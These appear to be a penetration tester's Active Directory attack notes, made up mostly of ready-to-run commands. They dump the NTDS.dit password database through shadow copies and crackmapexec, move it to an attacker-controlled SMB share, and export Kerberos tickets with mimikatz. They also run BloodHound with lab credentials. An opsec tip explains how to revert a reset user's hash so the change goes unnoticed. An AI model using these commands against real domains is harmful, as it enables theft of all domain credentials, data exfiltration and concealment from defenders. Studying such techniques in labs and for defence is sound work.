# AD Tips

% active diretory

## Manual dumping NTDS.DIT as a user in Admin group/DA group
```
# Check local group membership > Admin group ?
net localgroup

# Check user priv including Domain
net user <USERNAME>

# Shadow copy of C:i, note the Shado copy volume name
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.DIT form the VSS
# example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\<..> c:\NTDS\NTDS.dit

# Create a SMB share on the attacker's machine

#  Transferring NTDS.dit to Attack Host
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATK IP>\<SHARENAME>
```

## Dumping NTDS.DIT - netexec (uses VSS)
```
crackmapexec smb <IP> -u <USER> -p <PASSWD> --ntds
```

## Harvest kerberos tickets from windows
```
# Harvest kerberos tickets from windows

# From mimikatz
mimikatz # privilege::debug
sekurlsa::tickets /export

dir *.kirbi
```

## Bloodhound - Finding non-default AD groups from injestor JSON output
```
#Bloodhound - Finding non-default AD groups from injestor JSON output 
# Non-default AD groups have the last part of their domains SID > 1000
 cat 20250731161542_groups.json | jq '.data[]
        | select((.ObjectIdentifier | split("-") | last | tonumber) > 1000)
        | [.ObjectIdentifier, .Properties.name, .Properties.whencreated]'
# DNS Admin which SID > 1000 is a default group, ignore it
```

# Faketime - Adhoc Kerberos auth
```
# Using faketime + ntpdate to avoid KRB_AP_ERR_SKEW(Clock skew too great)

# Internal or via ligolo
faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \
bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2

# Through proxy or ssh
proxychains -q faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \ 
bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2 --dns-tcp

# source : https://notes.benheater.com/books/active-directory/page/using-faketime-for-ad-hoc-kerberos-authentication
```

# impacket - secretsdumps
```
Useful options :
-pwd-last-set -user-status -history

Faster cracking if recent passwords are a variation of older ones that got cracked.

Opsec :
If you used ForcedPassword on a user to set a users's password
You can revert the user's hash to its previous value to make it appear unchanged
```

# Reminder : Domain name resolution
```
- Domain/DC name resolution
Once you've found a domain name + a DC for it, add to the /etc/hosts the matching resolution :
X.X.X.X domain.tld dc.domain.tld dc01.domain.tld

It is especially when using kerberos authentication and avoid LDAP authentication errors
- Name server
Specify the DC's ip for a given domain using -ns/-nameserver parameters in most tools.
```
